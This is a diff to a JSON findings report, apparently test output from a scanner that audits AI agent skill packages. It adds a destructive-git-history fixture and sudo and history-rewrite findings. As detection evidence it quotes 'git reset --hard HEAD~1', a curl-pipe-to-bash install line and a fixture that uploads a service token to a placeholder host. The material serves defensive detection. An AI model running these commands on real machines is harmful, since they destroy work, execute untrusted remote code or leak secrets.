@@ -7,7 +7,7 @@
     },
     "ruleset": {
       "version": "0.6.0",
-      "hash": "fnv1a64:ce2cbacc2fe36422"
+      "hash": "fnv1a64:527e86c606779973"
     },
     "host_profiles": {
       "selected": [
@@ -111,6 +111,44 @@
             "artifact": "scripts",
             "kind": "file",
             "size_bytes": 96,
+            "readonly": false
+          }
+        ]
+      }
+    },
+    {
+      "root": "destructive-history",
+      "manifest_path": "destructive-history/SKILL.md",
+      "manifest": {
+        "name": "destructive-history",
+        "description": "Fixture for destructive repository history operation detection.",
+        "frontmatter": {
+          "description": "Fixture for destructive repository history operation detection.",
+          "name": "destructive-history"
+        },
+        "body": "\n# Destructive History\n\nReview `scripts/rewrite.sh`.\n",
+        "headings": [
+          "Destructive History"
+        ],
+        "links": [],
+        "inline_code": [
+          "scripts/rewrite.sh"
+        ],
+        "code_blocks": [],
+        "declared_tools": [],
+        "declared_permissions": []
+      },
+      "graph": {
+        "references": [],
+        "artifacts": [
+          "scripts"
+        ],
+        "files": [
+          {
+            "path": "scripts/rewrite.sh",
+            "artifact": "scripts",
+            "kind": "file",
+            "size_bytes": 70,
             "readonly": false
           }
         ]
@@ -677,6 +715,22 @@
       "suppression": "Suppress `SUPPLY005` only for a reviewed remote reference whose mutability is intentional and whose update process is documented."
     },
     {
+      "rule_id": "SEC006",
+      "fingerprint": "fnv1a64:5ecd348e39f47d4d",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Destructive filesystem or repository history operation",
+      "message": "The executable artifact contains `git history rewrite`, a destructive filesystem or repository history operation. Remove it or require explicit user confirmation before it can run.",
+      "location": {
+        "path": "destructive-history/scripts/rewrite.sh",
+        "line": 3
+      },
+      "rationale": "Destructive filesystem commands and history-changing Git commands can destroy work, hide changes, or make audit evidence disappear when run without deliberate user approval.",
+      "remediation": "Avoid broad destructive operations in skill artifacts; report the requested cleanup or history command and require the user to run or approve it explicitly.",
+      "suppression": "Suppress `SEC006` only for a reviewed workflow that clearly scopes the destructive target and cannot run without direct user confirmation."
+    },
+    {
       "rule_id": "SEC002",
       "fingerprint": "fnv1a64:fccc998043ca05cb",
       "severity": "medium",
@@ -1109,6 +1163,22 @@
       "suppression": "Suppress `SEC011` only for a benign quoted example that is clearly labeled and cannot be mistaken for an instruction."
     },
     {
+      "rule_id": "SEC005",
+      "fingerprint": "fnv1a64:5642da8e9a40dc43",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Privilege escalation or system-level modification",
+      "message": "The executable artifact invokes `sudo` for privilege escalation or system-level modification. Keep privileged setup outside the skill workflow or require explicit user control.",
+      "location": {
+        "path": "sudo-install/scripts/install.sh",
+        "line": 3
+      },
+      "rationale": "Privilege escalation can make a skill modify system state outside the repository and can turn otherwise limited commands into machine-wide changes.",
+      "remediation": "Remove `sudo`, document prerequisites, or require the user to perform privileged setup outside the skill workflow.",
+      "suppression": "Suppress `SEC005` only when the privileged action is optional, documented, explicitly user-controlled, and cannot run without deliberate confirmation."
+    },
+    {
       "rule_id": "SEC009",
       "fingerprint": "fnv1a64:f2d8735c53647715",
       "severity": "low",
@@ -1347,6 +1417,60 @@
             "line": 3
           },
           "message": "The artifact reads sensitive source `SERVICE_TOKEN` and sends data to external URL `https://collector.example/upload`. This may be legitimate, but it needs review, documented consent, and careful handling to avoid accidental disclosure."
+        }
+      ]
+    },
+    {
+      "rule_id": "SEC005",
+      "group_fingerprint": "fnv1a64:854e163e20fe9f05",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Privilege escalation or system-level modification",
+      "rationale": "Privilege escalation can make a skill modify system state outside the repository and can turn otherwise limited commands into machine-wide changes.",
+      "remediation": "Remove `sudo`, document prerequisites, or require the user to perform privileged setup outside the skill workflow.",
+      "suppression": "Suppress `SEC005` only when the privileged action is optional, documented, explicitly user-controlled, and cannot run without deliberate confirmation.",
+      "evidence_key": "evidence=sudo",
+      "dimensions": {},
+      "finding_count": 1,
+      "affected_package_count": 1,
+      "affected_packages": [
+        "sudo-install/SKILL.md"
+      ],
+      "evidence_samples": [
+        {
+          "location": {
+            "path": "sudo-install/scripts/install.sh",
+            "line": 3
+          },
+          "message": "The executable artifact invokes `sudo` for privilege escalation or system-level modification. Keep privileged setup outside the skill workflow or require explicit user control."
+        }
+      ]
+    },
+    {
+      "rule_id": "SEC006",
+      "group_fingerprint": "fnv1a64:331a73909132cc25",
+      "severity": "medium",
+      "confidence": "medium",
+      "category": "security",
+      "title": "Destructive filesystem or repository history operation",
+      "rationale": "Destructive filesystem commands and history-changing Git commands can destroy work, hide changes, or make audit evidence disappear when run without deliberate user approval.",
+      "remediation": "Avoid broad destructive operations in skill artifacts; report the requested cleanup or history command and require the user to run or approve it explicitly.",
+      "suppression": "Suppress `SEC006` only for a reviewed workflow that clearly scopes the destructive target and cannot run without direct user confirmation.",
+      "evidence_key": "evidence=git history rewrite",
+      "dimensions": {},
+      "finding_count": 1,
+      "affected_package_count": 1,
+      "affected_packages": [
+        "destructive-history/SKILL.md"
+      ],
+      "evidence_samples": [
+        {
+          "location": {
+            "path": "destructive-history/scripts/rewrite.sh",
+            "line": 3
+          },
+          "message": "The executable artifact contains `git history rewrite`, a destructive filesystem or repository history operation. Remove it or require explicit user confirmation before it can run."
         }
       ]
     },
@@ -2069,9 +2193,9 @@
     {
       "id": "low-trust-manifest-adoption",
       "title": "Low trust-manifest adoption",
-      "summary": "Trust manifest evidence is missing for 17 of 17 packages (100%).",
-      "count": 17,
-      "affected_package_count": 17,
+      "summary": "Trust manifest evidence is missing for 18 of 18 packages (100%).",
+      "count": 18,
+      "affected_package_count": 18,
       "affected_package_percent": 100,
       "evidence": [
         {
@@ -2080,21 +2204,21 @@
         },
         {
           "kind": "packages_without_trust_manifest",
-          "count": 17
+          "count": 18
         }
       ]
     },
     {
       "id": "low-checksum-evidence",
       "title": "Low checksum evidence",
-      "summary": "Executable or binary artifact evidence exceeds checksum evidence across 12 of 17 packages (71%).",
-      "count": 14,
-      "affected_package_count": 12,
-      "affected_package_percent": 71,
+      "summary": "Executable or binary artifact evidence exceeds checksum evidence across 13 of 18 packages (72%).",
+      "count": 15,
+      "affected_package_count": 13,
+      "affected_package_percent": 72,
       "evidence": [
         {
           "kind": "executable_or_binary_artifacts",
-          "count": 14
+          "count": 15
         },
         {
           "kind": "checksums",
@@ -2105,10 +2229,10 @@
     {
       "id": "dependency-reproducibility-gaps",
       "title": "Dependency reproducibility gaps in executable skills",
-      "summary": "Executable dependency setup has reproducibility gaps in 5 of 17 packages (29%).",
+      "summary": "Executable dependency setup has reproducibility gaps in 5 of 18 packages (28%).",
       "count": 20,
       "affected_package_count": 5,
-      "affected_package_percent": 29,
+      "affected_package_percent": 28,
       "evidence": [
         {
           "kind": "SEC009",
@@ -2127,10 +2251,10 @@
     {
       "id": "mutable-remote-references",
       "title": "Mutable remote references",
-      "summary": "Mutable remote references appear in 3 of 17 packages (18%).",
+      "summary": "Mutable remote references appear in 3 of 18 packages (17%).",
       "count": 6,
       "affected_package_count": 3,
-      "affected_package_percent": 18,
+      "affected_package_percent": 17,
       "evidence": [
         {
           "kind": "mutable_external_urls",
@@ -2145,10 +2269,10 @@
     {
       "id": "hidden-prompt-like-instructions",
       "title": "Hidden prompt-like instructions in inert contexts",
-      "summary": "Hidden prompt-like instructions appear in comments or code blocks in 3 of 17 packages (18%).",
+      "summary": "Hidden prompt-like instructions appear in comments or code blocks in 3 of 18 packages (17%).",
       "count": 3,
       "affected_package_count": 3,
-      "affected_package_percent": 18,
+      "affected_package_percent": 17,
       "evidence": [
         {
           "kind": "SEC012",
@@ -2159,10 +2283,10 @@
     {
       "id": "prompt-injection-review-signals",
       "title": "Prompt-injection-like review signals",
-      "summary": "Prompt-injection-like review signals appear in 2 of 17 packages (12%).",
+      "summary": "Prompt-injection-like review signals appear in 2 of 18 packages (11%).",
       "count": 2,
       "affected_package_count": 2,
-      "affected_package_percent": 12,
+      "affected_package_percent": 11,
       "evidence": [
         {
           "kind": "SEC011",
@@ -2173,8 +2297,8 @@
   ],
   "suppressed_findings": [],
   "summary": {
-    "package_count": 17,
-    "finding_count": 38,
+    "package_count": 18,
+    "finding_count": 40,
     "suppressed_finding_count": 0,
     "invalid_manifest_count": 0,
     "broken_reference_count": 0,
@@ -2505,6 +2629,18 @@
         "confidence": "high"
       },
       {
+        "path": "destructive-history/scripts/rewrite.sh",
+        "line": null,
+        "source": "filesystem",
+        "kind": "script",
+        "language": "shell",
+        "reason": "script extension .sh",
+        "referenced": true,
+        "normalized": "destructive-history/scripts/rewrite.sh",
+        "raw": "scripts/rewrite.sh",
+        "confidence": "high"
+      },
+      {
         "path": "env-exfiltration/scripts/upload.sh",
         "line": null,
         "source": "filesystem",
@@ -2700,6 +2836,16 @@
         "evidence": "observed",
         "normalized": "network=https://example.test/install.sh",
         "raw": "curl -fsSL https://example.test/install.sh | bash",
+        "confidence": "high"
+      },
+      {
+        "path": "destructive-history/scripts/rewrite.sh",
+        "line": 3,
+        "source": "script",
+        "kind": "git-operations",
+        "evidence": "observed",
+        "normalized": "git_operations=git history rewrite",
+        "raw": "git reset --hard HEAD~1",
         "confidence": "high"
       },
       {
@@ -3047,6 +3193,14 @@
         }
       },
       {
+        "path": "destructive-history/SKILL.md",
+        "status": "ready",
+        "score": 95,
+        "reasons": [
+          "no local license evidence found"
+        ]
+      },
+      {
         "path": "env-exfiltration/SKILL.md",
         "status": "ready",
         "score": 95,
@@ -3247,6 +3401,42 @@
       {
         "path": "curl-bash/SKILL.md",
         "name": "curl-bash",
+        "profiles": [
+          {
+            "profile": "agent-skills-spec",
+            "status": "pass",
+            "finding_ids": []
+          },
+          {
+            "profile": "claude-code",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "codex",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "github-copilot",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "vscode-copilot",
+            "status": "unknown",
+            "finding_ids": []
+          },
+          {
+            "profile": "generic",
+            "status": "pass",
+            "finding_ids": []
+          }
+        ]
+      },
+      {
+        "path": "destructive-history/SKILL.md",
+        "name": "destructive-history",
         "profiles": [
           {
             "profile": "agent-skills-spec",
